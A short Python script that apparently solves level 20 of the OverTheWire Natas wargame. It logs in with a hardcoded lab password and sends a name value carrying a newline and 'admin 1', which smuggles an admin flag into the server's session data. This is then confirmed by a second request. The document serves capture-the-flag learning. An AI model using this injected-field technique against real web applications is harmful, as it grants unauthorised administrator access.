import requests 

session = requests.Session()


response = session.post('http://natas20.natas.labs.overthewire.org/', auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'), data = {'name': 'hello\nadmin 1'})
print(response.text);

response = session.get('http://natas20.natas.labs.overthewire.org/', auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'))
print(response.text);
        